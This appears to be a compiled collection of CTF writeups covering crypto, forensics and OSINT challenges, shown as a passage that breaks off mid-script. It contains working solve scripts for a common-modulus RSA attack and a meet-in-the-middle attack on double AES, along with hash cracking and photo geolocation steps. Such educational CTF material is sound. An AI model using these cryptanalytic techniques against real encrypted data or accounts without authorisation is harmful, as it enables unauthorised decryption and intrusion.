<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-doomhackctf
description: CTF writeups and security challenges by DoomHackCTF.
---

# Writeups by DoomHackCTF

Source repository: `/repos/DoomHackCTF`

## Repository Index

- WriteUps/picoCTF2022/Forensics/Eavesdrop/README.md
- WriteUps/picoCTF2022/Forensics/Enhance!/README.md
- WriteUps/picoCTF2022/Forensics/File types/README.md
- WriteUps/picoCTF2022/Forensics/Lookey here/README.md
- WriteUps/picoCTF2022/Forensics/Operation Oni/README.md
- WriteUps/picoCTF2022/Forensics/Operation Orchid/README.md
- WriteUps/picoCTF2022/Forensics/Packets Primer/README.md
- WriteUps/picoCTF2022/Forensics/Redaction gone wrong/README.md
- WriteUps/picoCTF2022/Forensics/SideChannel/README.md
- WriteUps/picoCTF2022/Forensics/Sleuthkit Apprentice/README.md
- WriteUps/picoCTF2022/Forensics/Sleuthkit intro/README.md
- WriteUps/picoCTF2022/Forensics/St3g0/README.md
- WriteUps/picoCTF2022/Crypto/basic-mod1/README.md
- WriteUps/picoCTF2022/Crypto/basic-mod2/README.md
- WriteUps/picoCTF2022/Crypto/credstuff/README.md
- WriteUps/picoCTF2022/Crypto/diffie-hellman/README.md
- WriteUps/picoCTF2022/Crypto/morse-code/README.md
- WriteUps/picoCTF2022/Crypto/substitution0/README.md
- WriteUps/picoCTF2022/Crypto/substitution1/README.md
- WriteUps/picoCTF2022/Crypto/substitution2/README.md
- WriteUps/picoCTF2022/Crypto/sum-o-primes/README.md
- WriteUps/picoCTF2022/Crypto/transposition-trial/README.md
- WriteUps/picoCTF2022/Crypto/vigenere/README.md
- WriteUps/mhsCTF-2022/Web/James Harold Japp/README.md
- WriteUps/mhsCTF-2022/General/Reconstruction/README.md
- WriteUps/mhsCTF-2022/Forensics/Blank Slate 2/README.md
- WriteUps/mhsCTF-2022/Forensics/Blank Slate 3/README.md
- WriteUps/mhsCTF-2022/Forensics/Blank Slate 4/README.md
- WriteUps/mhsCTF-2022/Forensics/Blatant Corruption/README.md
- WriteUps/mhsCTF-2022/Forensics/Chimera/README.md
- WriteUps/mhsCTF-2022/Forensics/In Plain Sight/README.md
- WriteUps/mhsCTF-2022/Crypto/Crash Hacker (Em Dee 2)/README.md
- WriteUps/mhsCTF-2022/Crypto/Em dee/README.md
- WriteUps/mhsCTF-2022/Crypto/Ipv11/README.md
- WriteUps/mhsCTF-2022/Crypto/Peanuts/README.md
- WriteUps/mhsCTF-2022/Crypto/What's Cooking 2/README.md
- WriteUps/mhsCTF-2022/Crypto/What's Cooking/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Case Loss/README.md
- WriteUps/OFPPT-CTF2022/Crypto/German riddle/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Lost Key/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Meet Me In Middle/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Milkshake/README.md
- WriteUps/OFPPT-CTF2022/Crypto/RSA Mod/README.md
- WriteUps/OFPPT-CTF2022/Crypto/RSA Small/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Rome famous general/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Transposition/README.md
- WriteUps/OFPPT-CTF2022/Crypto/Weird sounds/README.md
- WriteUps/OFPPT-CTF2022/Crypto/XOR/README.md
- WriteUps/KnightCTF-2022/Osint/Canada Server/README.md
- WriteUps/KnightCTF-2022/Osint/Explosion In Front Of Bank Of Spain/README.md
- WriteUps/KnightCTF-2022/Osint/Find The Camera/README.md
- WriteUps/KnightCTF-2022/Networking/How's the Shark? /README.md
- WriteUps/KnightCTF-2022/Digital Forensics/Lets Walk Together/README.md
- WriteUps/KnightCTF-2022/Digital Forensics/Lost Flag/README.md
- WriteUps/KnightCTF-2022/Crypto/Jimble/README.md
- WriteUps/KnightCTF-2022/Crypto/Passwd/README.md
- WriteUps/DiceCTF-2022/Pwn/interview-opportunity.md
- WriteUps/1337CTF/Crypto/Binomial Ways/README.md
- WriteUps/1337CTF/Crypto/Equality/README.md
- WriteUps/1337CTF/Crypto/Warmup Encoder/README.md

## Writeup Content


### File: WriteUps/1337CTF/Crypto/Binomial Ways/README.md

<img src="img/challenge.png">

We are given the following code:
```python
from secret import flag
val = []
flag_length = len(flag)
print(flag_length)

def factorial(n):
    f = 1
    for i in range(2, n+1):
        f *= i
    return f

def series(A, X, n):
    nFact = factorial(n)
    for i in range(0, n + 1):
        niFact = factorial(n - i)
        iFact = factorial(i)
        aPow = pow(A, n - i)
        xPow = pow(X, i)
        val.append(int((nFact * aPow * xPow) / (niFact * iFact)))

A = 1; X = 1; n = 30
series(A, X, n)
ct = []
for i in range(len(flag)):
    ct.append(chr(ord(flag[i])+val[i]%26))
print(''.join(ct))
```
Analyzing the code we find that the same numbers are always generated, so we can easily get the original message by changing this line.
```python
ct.append(chr(ord(flag[i])+val[i]%26))
```
to this.

```python
ct.append(chr(ord(flag[i])-val[i]%26))
```
(Full code in case you need it)
```python
flag = "27F;VPbAs>clu}={9ln=_o1{0n5tp~"
val = []
flag_length = len(flag)
print(flag_length)

def factorial(n):
    f = 1
    for i in range(2, n+1):
        f *= i
    return f

def series(A, X, n):
    nFact = factorial(n)
    for i in range(0, n + 1):
        niFact = factorial(n - i)
        iFact = factorial(i)
        aPow = pow(A, n - i)
        xPow = pow(X, i)
        val.append(int((nFact * aPow * xPow) / (niFact * iFact)))

A = 1; X = 1; n = 30
series(A, X, n)
pt = []
for i in range(len(flag)):
     pt.append(chr((ord(flag[i])-val[i]%26)&255))
print("".join(pt))
```
```shell
❯ python solve.py
30
1337UPUAf>Vlh{(o$ja=Ro${#n4p]z
```
(Apparently this flag was bugged, hence the format). 



### File: WriteUps/1337CTF/Crypto/Equality/README.md

<img src="img/challenge.png">

We have a txt file with the following RSA values:
```ptyhon
n = '0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875' 
e = '0x3045' 
ct = '0x5d1e39bc751108ec0a1397d79e63c013d238915d13380ae649e84d7d85ebcffbbc35ebb18d2218ccbc5409290dfa8a4847e5923c3420e83b1a9d7aa67190dc0d34711cce261665c64c28ed2834394d4b181926febf7eb685f9ce81f36c7fb72798da3a14a123287171d26e084948aab0fba81c53f10b5696fc291006254ee690'

n2 = '0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875' 
e2 = '0xff4d' 
ct2 = '0x3d90f2bec4fe02d8ce4cece3ddb6baed99337f7e6856eef255445741b5cfe378390f058679d70236e51be4746db4c207f274c40b092e24f8c155a0957867e84dca48e27980af488d2615a280c6eadec2f1d30b95653b1ee3135e2edff100dd2c529994f846722f811348b082d0bec7cfab579a4bd0ab789928b1bebed68d628f'
```
Both n's are the same, but the cipher texts and e's are different. 

Thanks to [this page](https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/) and [this page](https://codeforgeweb.wordpress.com/2018/11/20/square-ctf-2018-c2-flipping-bits/) i could come up with a solution, this attack is known as <strong>common modulus attack.</strong>

We can recover the flag following the [Bézout’s identity](https://en.wikipedia.org/wiki/B%C3%A9zout%27s_identity) which states:
```
There exist integers or polynomials x and y such that ax + by = d
```
Where **a** and **b** are **our e's**, and **d** is the **gcd** of both e's (in the case of my implementation x is u and y is v). We can get these numbers using the extended euclidean algorithm, so i used [this implementation](https://www.techiedelight.com/extended-euclidean-algorithm-implementation/).
```python
def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        gcd, x, y = extended_gcd(b % a, a)
        return gcd, y - (b // a) * x, x
```

We get that **u = 9240** and **v = -1747**, since v is negative we need to compute the inverse of the second ciphertext.
```python
ct2_inv = (inverse(ct2, n))
```
And to get the message we need to perform the following operation:
```python
m = (pow(ct, u, n) * pow(ct2_inv, -v, n)) % n
```
Full python code 
```python
from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes, GCD
from ast import literal_eval

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        gcd, x, y = extended_gcd(b % a, a)
        return gcd, y - (b // a) * x, x

n = '0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875' 
e = '0x3045' 
ct = '0x5d1e39bc751108ec0a1397d79e63c013d238915d13380ae649e84d7d85ebcffbbc35ebb18d2218ccbc5409290dfa8a4847e5923c3420e83b1a9d7aa67190dc0d34711cce261665c64c28ed2834394d4b181926febf7eb685f9ce81f36c7fb72798da3a14a123287171d26e084948aab0fba81c53f10b5696fc291006254ee690'

n2 = '0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875' 
e2 = '0xff4d' 
ct2 = '0x3d90f2bec4fe02d8ce4cece3ddb6baed99337f7e6856eef255445741b5cfe378390f058679d70236e51be4746db4c207f274c40b092e24f8c155a0957867e84dca48e27980af488d2615a280c6eadec2f1d30b95653b1ee3135e2edff100dd2c529994f846722f811348b082d0bec7cfab579a4bd0ab789928b1bebed68d628f'

n = (literal_eval(n))
e = (literal_eval(e))
e2 = (literal_eval(e2))
ct = (literal_eval(ct))
ct2 = literal_eval(ct2)
gdc, u,v = extended_gcd(e,e2)
ct2_inv = (inverse(ct2, n))
m = (pow(ct, u, n) * pow(ct2_inv, -v, n)) % n
print(long_to_bytes(m))
```
```shell
❯ python solve.py
b'1337UP{c0mm0n_m0dulu5_4774ck_15_n07_50_c0mm0n}'
```



### File: WriteUps/1337CTF/Crypto/Warmup Encoder/README.md

<img src="img/challenge.png">

We have the following code

```python
# ENCRYPT.py

from sympy import isprime, prime

flag = '<REDACTED>'

def Ord(flag):
    x0r([ord(i) for i in flag])
    
def x0r(listt):
    ff = []
    for i in listt:
        if isprime(i) == True:
            ff.append(prime(i) ^ 0x1337)
        else:
            ff.append(i ^ 0x1337)
    b1n(ff)

def b1n(listt):
    ff = []
    for i in listt:
        ff.append(int(bin(i)[2:]))
    print(ff)
    
if __name__ == "__main__":
    Ord(flag)

'''
 OUTPUT :
[1001100000110, 1001100000100, 1001100000100, 1001100000000, 1001101100010, 1001101100111, 1001101001100, 1001101001111, 1001100000111, 1001101000101, 1001101101000, 1001100000011, 1001101011001, 1001101110011, 1001101101000, 1001101110101, 1001101011110, 1001101011001, 1001100000011, 1001011001010, 1001101100101, 1001101001110, 1001101101000, 1001101110010, 1001101011001, 1001001111100, 1001100000111, 1001101010011, 1001100000100, 1001101000101, 1001101101000, 1001100000011, 1001101000101, 1001100000100, 1001101101000, 1001101000011, 1001101111111, 1001100000100, 1001101101000, 1001101100000, 1001100000100, 1001100000011, 1000101111100, 1001100000100, 1001111000110, 1001101000011, 1001101101000, 1001100001111, 1001100000111, 1001100000000, 1001100001110, 1001100000111, 1001100000000, 1001111000110, 1001100000001, 1001101001010]
'''
```

We can easily decode the output by reversing the process.

```python
from sympy import isprime, prime, sieve

# Transforms base2 to base10.
def unb1n(bin):
    dec = []
    for i in bin:
        b = str(i)
        #print(b, int(b,2))
        dec.append(int(b,2))
    return unx0r(dec)


def unx0r(lista):
    un = []
    for i in lista:
        x = i ^ 0x1337
        if isprime(x):
            # if the number we get is prime it means we need
            #to get its index in the sieve to get the original number 
            un.append(sieve.search(x)[0])
        else:
            un.append(x)
    return to_char(un)

def to_char(lista):
    return "".join(chr(c) for c in lista)

bin = [1001100000110, 1001100000100, 1001100000100, 1001100000000, 1001101100010, 1001101100111, 1001101001100, 1001101001111, 1001100000111, 1001101000101, 1001101101000, 1001100000011, 1001101011001, 1001101110011, 1001101101000, 1001101110101, 1001101011110, 1001101011001, 1001100000011, 1001011001010, 1001101100101, 1001101001110, 1001101101000, 1001101110010, 1001101011001, 1001001111100, 1001100000111, 1001101010011, 1001100000100, 1001101000101, 1001101101000, 1001100000011, 1001101000101, 1001100000100, 1001101101000, 1001101000011, 1001101111111, 1001100000100, 1001101101000, 1001101100000, 1001100000100, 1001100000011, 1000101111100, 1001100000100, 1001111000110, 1001101000011, 1001101101000, 1001100001111, 1001100000111, 1001100000000, 1001100001110, 1001100000111, 1001100000000, 1001111000110, 1001100000001, 1001101001010]
print(unb1n(bin))
```

```shell
❯ python solve.py
1337UP{x0r_4nD_Bin4aRy_EnC0d3r_4r3_tH3_W34k35t_80790756}
```



### File: WriteUps/KnightCTF-2022/Crypto/Jimble/README.md

<h1>Jumble<h1>

<h3>My friend Saif from Saudi Arabia has started his CS course. Being a fan of cryptography, he tries to apply everything taught in his courses to enccrypt stuffs. Recently, he sent me this script and a ciphertext. Can you find out what he wants to say?</h3>

<h4> We have the following code<h4>
<img src="images/enc.png">
<h4> and the following ciphertext </h4>

<strong>0un5hfz02zq=ntvb0=rzfmsx</strong>

<h4> we do the inverse process and get the flag </h4>
<img src="images/solve.png">
<h4> flag is: KCTF{y0u_g0t_m3} </h4> 



### File: WriteUps/KnightCTF-2022/Crypto/Passwd/README.md

<h1>Passwd</h1>

<h3>Find out the password of knight user.</h3>

<h4>We are given a file with a linux log in the last line we have a hash</h4>
<img src="images/hash.png">

<h4>if we enter this hash in hashkiller we get the following</h4>

<img src="images/dec_hash.png">

<h4> flag is KCTF{exploit} </h4> 




### File: WriteUps/KnightCTF-2022/Digital Forensics/Lets Walk Together/README.md

<h1> Let's Walk Together <h1>

<h3> Do you know anything about this image? </h3>

<img src="images/interesting_waves.png">

<p>I used foremost in the image which revealed a folder named zip that contains a zip inside. I performed the following operations in it and found the password. </p>

<img src= "images/pass2.png">

<p>Once i had the password i unzipped it and opened the flag.txt file</p>

<strong> The flag is: KCTF{BiNw4lk_is_h3lpfUl} </strong>





### File: WriteUps/KnightCTF-2022/Digital Forensics/Lost Flag/README.md

<h1> Lost Flag </h1>

<h3> We recovered a image file from an incident. There might be something interesting in the file. Give it a try. </h3>

<p> We are given this image </p>

<img src = "images/Lost Flag .png" >

<p> After analizing the image with different tools i found the flag using stegsolver </p>

<img src = "images/sol.png">



### File: WriteUps/KnightCTF-2022/Networking/How's the Shark? /README.md

<h1> How's the Shark? </h1>

<h3> Find the flag from the following. </h3>

<p> We are given a pcapng file i tried to find the flag with strings but the result was a fake flag </p>
<img src="images/fake.png">

<p>So i decided to export the http objects, inside of these objects we have a picture with the flag.</p>

<img src="images/something.png">



### File: WriteUps/KnightCTF-2022/Osint/Canada Server/README.md

<h1>Canada Server</h1>

<h3>Our sponsor NS TechValley had some problems last year. Their Canada server was not working as expected. Can you find the IP address of that server?</br>

Flag Format : KCTF{IP_Address_Here}</h3>

<p>Solution: you can know the ip of a webpage by making ping with it</p>

<img src="images/flag.png">

<strong>The flag is: KCTF{192.99.167.83}</strong>



### File: WriteUps/KnightCTF-2022/Osint/Explosion In Front Of Bank Of Spain/README.md

<h1>Explosion In Front Of Bank Of Spain</h1>

<h3>One of my friend sent me the picture and told me that, there was an explotion in front of the Bank of Spain by some robbers a few days ago. After hearing that, I googled about incident. But I discovered that, The picture he gave is not the picture of Bank Of Spain. So, now I want to know the exact location of the picture so that I can know about the incident of that explotion. Can you please help me to find that place? Please send me the coordinates of that location if you can figure it out.</br>
Flag Format: KCTF{xx.xxxxxxx,-x.xxxxxxx}.
</h3>

<img src="images/Explosion_In_Front_Of_Bank_Of_Spain.png">

<p>I reversed search the image in yandex and found [this article](https://www.klook.com/en-SG/blog/money-heist-film-locations/).</br>

If you check the fifth position in the top you'll find that it is Ministerio de Transportes, Movilidad y Agenda Urbana in Spain.</br>

Search it in google maps, the coordinates are in the url.</p>

<img src="images/solution.png">

<strong>The flag is: KCTF{40.4442164,-3.6936083}</strong>




### File: WriteUps/KnightCTF-2022/Osint/Find The Camera/README.md

<h1>Find The Camera</h1>

<h3>Can you find the manufacturer and the model number of the camera that took the picture of this bus?</br>

Note: The whole flag is in Upper Case letters and replace any special character or space with underscores.</br>

Flag Format: KCTF{MANUFACTURER_MODEL_SINGLELETTERNUMBER}</h3>

<img src="images/Bus.png">

<p> I reversed search the image in yandex and found one russian page that contained it
(http://fotobus.msk.ru/photo/267442/?vid=204172), scrolling down i found all the data of the bus and camera.</p>

<img src="images/3.png">

<strong>The flag is: KCTF{SONY_DSC_S980}</strong>



### File: WriteUps/OFPPT-CTF2022/Crypto/Case Loss/README.md

# Case loss
#####  can you help me brute force the case on this base 64 encoded string in order to help me find the secret message?
##### Ciphertext: t0zqufqtq1rge2jsvxqzzjbyqzfur19iyvmznjrfmvnfm2ftex0

The first thing i did was to divide the cipher text into chunks of four and then get all the possible combinations of upper and lowercase letters of the chunk.
```python
for i in range(0, len(flag_enc), 4):
    temp = flag_enc[i:i+4]
    comb = set(map(''.join, itertools.product(*zip(temp.upper(), temp.lower()))))
```
Then i decoded these chunks and printed the ones that didn't have any weird characters and/or were readable. 
```python
for part in comb:
    try :          
        plain = (base64.b64decode(part.ljust(8, '=')).decode('utf-8'))
      
        if not has_weird_chars(plain):
            print(part, plain)
    except:
        pass
```
And from there i remade the original text with the parts that made sense.
```shell
❯ python solve.py
T0ZQ OFP --
T0Zq OFj
UFQt PT- --
Q1Rg CT`
Q1RG CTF --
e2Js {bl
e2JS {bR --
VXQz Ut3 --
ZjBy f0r --
ZjBY f0X
QzFu C1n --
QzFU C1T
R19I G_H
R19i G_b --
YVMz aS3 --
NjRF 64E
NjRf 64_ --
MVNF 1SE
MVNf 1S_ --
M2Ft 3am
M2FT 3aS --
eX0 y} --
```
**OFPPT-CTF{bRUt3f0rC1nG_baS364_1S_3aSy}**

Full code
```python
import itertools
import base64
import string
def has_weird_chars(text):
    for c in text:
        o = ord(c)
        if o < 33 or o > 126:
            return True
    return False
alphabet = string.ascii_letters + "0123456789"
#print(alphabet)
flag_enc = "t0zqufqtq1rge2jsvxqzzjbyqzfur19iyvmznjrfmvnfm2ftex0"
flag = ""
# every 4 characters of base64 are 3 characters of the original text
for i in range(0, len(flag_enc), 4):
    temp = flag_enc[i:i+4]
    comb = set(map(''.join, itertools.product(*zip(temp.upper(), temp.lower()))))
    for part in comb:
        try :          
            plain = (base64.b64decode(part.ljust(8, '=')).decode('utf-8'))
          
            if not has_weird_chars(plain):
                print(part, plain)
        except:
            pass
```



### File: WriteUps/OFPPT-CTF2022/Crypto/German riddle/README.md

# German riddle
#####  We have intercepted a suspicious communication, but unfortunately, some data was corrupted during transmission. Can you recover the message?
##### M4 UKW $ Gamma 5 3 $ 8 2 $ 5 12 $ 2 ? rf cq dn ej kb mt os wz px ah
##### Ciphertext: bxkf apdl wwuw wfup wixd aqfy zua (Words in the flag should be separated by underscores, and the flag formatted as : OFPPT-CTF{text_after_ofpptctf})

The title and description imply this is an [enigma cipher](https://en.wikipedia.org/wiki/Enigma_machine), so i went to [cryptii](https://cryptii.com/) and entered the parameters of the description.

<img src="img/enigma.png">

**OFPPT-CTF{german_enigma_decoded}**



### File: WriteUps/OFPPT-CTF2022/Crypto/Lost Key/README.md

# Lost Key
#####  Can you decipher the following? JNVTG-GKJ{Q1o3t3v3_q3g0u1rb_e17n_oa0ae_73b7}
##### By the way, I lost the key. Sorry!

We have a keyed cipher, which i thought was vigenere, so i tried bruteforcing the key since the first part of the text is known (OFPPT-CTF). For this task i used [cyberchef](https://gchq.github.io/CyberChef/).

Turns out the key for the ciphertext was **vigenere.**
<img src="img/flag.png">



### File: WriteUps/OFPPT-CTF2022/Crypto/Meet Me In Middle/README.md

# Meet Me In Middle 
#####  A company has deployed their own cryptographic service. They challenged anyone to break it even if they have shared the source code. The keys are unknown to everyone but them.
##### Fortunately, their encryption algorithm is vulnerable. Could you help us break the encryption and read their secret flag? 

We have the following encrypted text:
```
Super strong encryption service approved by 2022 stansdards.
Message to decrypt:
187f25ea856f518bcd8e7e7c17e7e6016bc77459513740e6792c84d07b465ea9cee6609881421eb4ae1606792a2d8859
Encrypt your text:
>
{"pt":"4f465050542d435446"}
f71f3b195e2336a6d30077b8184304c6
```
And the following code:
```python
from random import randint
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import json

flag = b'OFPPT-CTF{Not_the_real_flag}'

def gen_key(option=0):
    alphabet = b'0123456789abcdef'
    const = b'0fpptCTF5!@#'
    key = b''
    for i in range(16-len(const)):
        key += bytes([alphabet[randint(0,15)]])

    if option:
        return key + const
    else:
        return const + key

def encrypt(data, key1, key2):
    cipher = AES.new(key1, mode=AES.MODE_ECB)
    ct = cipher.encrypt(pad(data, 16))
    cipher = AES.new(key2, mode=AES.MODE_ECB)
    ct = cipher.encrypt(ct)
    return ct.hex()


def challenge():
    k1 = gen_key()
    k2 = gen_key(1)

    
    ct = encrypt(flag, k1, k2)
    
    
    print('Super strong encryption service approved by 2022 stansdards.\n'+\
                    'Message to decrypt:\n' +ct + '\nEncrypt your text:\n> ')
    try:
            
        dt = json.loads(input().strip())
        pt = bytes.fromhex(dt['pt'])
        res = encrypt(pt, k1, k2)
        print(res + '\n')
        exit(1)
    except Exception as e:
        print(e)
        print('Invalid payload.\n')
        exit(1)
    
if __name__ == "__main__":
    challenge()
```
As we can see, the flag is encrypted twice with **AES-ECB** with two different keys, and after that the program asks us to input a plaintext and then ecrypts it with the same two keys.

The key generation is weak due to it having only 4 random characters and we know the alphabet

This is a **Meet in the middle attack** and the problem is almost the exact same as the one in this [writeup](https://int80h.netlify.app/writeup/byte-bandits-2020-meet-me-there/).

What we need to do the is the following:
* Encrypt the plain text we are given with all the possible key1 and save all the ciphertexts with their respective keys.
* Decrypt the ciphertext we are given with all the possible key2.
* If we find a coincidence it means we found both keys.

(Code taken from the writeup mentioned above).

```python
#!/usr/bin/python

import binascii
import sys
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from string import printable

pt = '4f465050542d435446'
ct = 'f71f3b195e2336a6d30077b8184304c6'
encrypted_flag = '187f25ea856f518bcd8e7e7c17e7e6016bc77459513740e6792c84d07b465ea9cee6609881421eb4ae1606792a2d8859'

ciphertext_dict = {}
alphabet = '0123456789abcdef'
const = '0fpptCTF5!@#'
for i in alphabet:
    for j in alphabet:
        for k in alphabet:
            for l in alphabet:
                suffix = ''.join([i, j, k, l])
                key1 = const + suffix
                cipher1 = AES.new(key=bytes(key1,'utf-8'), mode=AES.MODE_ECB)
                c1 = cipher1.encrypt(pad(bytes.fromhex(pt),16))
                ciphertext_dict[c1] = suffix

win_suffix = ""
win_prefix = ""

for i in alphabet:
    for j in alphabet:
        for k in alphabet:
            for l in alphabet:
                prefix = ''.join([i, j, k,l])
                key2 = prefix + const
                cipher2 = AES.new(key=bytes(key2, 'utf-8'), mode=AES.MODE_ECB)
                c2 = cipher2.decrypt(bytes.fromhex(ct))
                if c2 in ciphertext_dict:
                    print("[+] Wow, found {} {}".format(binascii.hexlify(bytes(ciphertext_dict[c2], 'utf-8')), binascii.hexlify(bytes(prefix,'utf-8'))))
                    win_suffix = ciphertext_dict[c2]
                    win_prefix = prefix

key1 = const + win_suffix
key2 = win_prefix + const 
print(key1)
print(key2)
c = AES.new(key=bytes(key2, 'utf-8'), mode=AES.MODE_ECB)
middle = c.decrypt(bytes.fromhex(encrypted_flag))
c = AES.new(key=bytes(key1,'utf-8'), mode=AES.MODE_ECB)
flag = binascii.unhexlify(c.decrypt(middle).hex())
print(flag)
```
```shell
❯ python solve.py
[+] Wow, found b'32663734' b'65613134'
0fpptCTF5!@#2f74
ea140fpptCTF5!@#
b'OFPPT-CTF{M33t_1n_Th3_Middle_4tt4ck_4_RS4}\x06\x06\x06\x06\x06\x06'
```



### File: WriteUps/OFPPT-CTF2022/Crypto/Milkshake/README.md

# Milkshake 250
##### This is a cyberchef special combo "milkshake"! Please don't hate me!
##### 4e3255334e5449784d6a45794e54566a4e7a49794e5463314e474d334f444d774e3249315a6a51334e6a497a4d4463794e6a59334e5451304e47553d

The message is encoded in hex, base64, hex again and rot 47.
```shell
❯ echo "4e3255334e5449784d6a45794e54566a4e7a49794e5463314e474d334f444d774e3249315a6a51334e6a497a4d4463794e6a59334e5451304e47553d" | xxd -r -p | base64 -d | xxd -r -p | tr ‘\!-~’ ‘P-~\!-O’
OFPPT-CTF{I_L0v3_C7Fs}⏎ 
```



### File: WriteUps/OFPPT-CTF2022/Crypto/RSA Mod/README.md

# RSA Mod

#####  An encrypted RSA message has been intercepted. Can you find a way to decrypt it?

We have are given a .txt with the following:
```
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x310ffa2576c3f1a193f625010cc41c21dac0022710e9c42916b81f60579738d833700faa94572bfc57eeec8b961ce6b1ec03d659ea9da71293d19419be1f2193a797c4eb933ff5a405443b1f4151fc253d4738c19c7cf0ed39e8624511d777b7fc7a866a3812ab4cc19038ca3a18f8e1f9df46dade804b9a3dc679726ef08a67576351aad20a60666623a26de367d41c56d21ed72c3402e66290e43fd87e277154de4ff2b2490bb599574b296c714afe090dba33f8e1e21b01bafab104f527bca35be930136d8df33fe81e7d87bb1b3b3ee45cc2614cfc61873e162d6521b230d7243748b229fda2d1d4e5f5f3def6349176f76876238ed3d8e1d6378a055767'}
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0xd646418a1491d8b7c970e3ede9fb997076a0be6b04e42d0ce0d9eb6658c59306a6794154539309708bc86afca5b8258774f644cb5894e7bd04352baf8a7a19b37157cf6cc47659aa3d8dab1b8056067a3cbaba97b6e3316d10eadabe7d14c0ba41c5b55dc8e8bddc88340e47765d12b6537c65f20aca56afc2e586b9b77f7bb43f3ee07fd4549cc591fd22270a3dbe23a158b0048090a5ce62d425299ae17123dd56b8bbf6fce700c61718ae2e723335936fb57b1a6c560a70a637cf5551bd9b9bdef02c0ee7973cb8522441b61e0d46d773fcf4b24ea2f4549e71ff8b2185e215fa00ba6a9f60312e5eee6c7c2b624cf45b65de56c0e4fc00bff55e1529733'}
```
We can see that the n's are the same for both ciphertexts, but the e's are different, this is a **common modulus attack** (i explain it in more depth [here](https://github.com/DoomHackCTF/WriteUps/tree/main/1337CTF/Crypto/Equality)).

```python
from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes, GCD
from ast import literal_eval

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        gcd, x, y = extended_gcd(b % a, a)
        return gcd, y - (b // a) * x, x

n = '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef'
e1 = '0x10001'
ct1 = '0x310ffa2576c3f1a193f625010cc41c21dac0022710e9c42916b81f60579738d833700faa94572bfc57eeec8b961ce6b1ec03d659ea9da71293d19419be1f2193a797c4eb933ff5a405443b1f4151fc253d4738c19c7cf0ed39e8624511d777b7fc7a866a3812ab4cc19038ca3a18f8e1f9df46dade804b9a3dc679726ef08a67576351aad20a60666623a26de367d41c56d21ed72c3402e66290e43fd87e277154de4ff2b2490bb599574b296c714afe090dba33f8e1e21b01bafab104f527bca35be930136d8df33fe81e7d87bb1b3b3ee45cc2614cfc61873e162d6521b230d7243748b229fda2d1d4e5f5f3def6349176f76876238ed3d8e1d6378a055767'

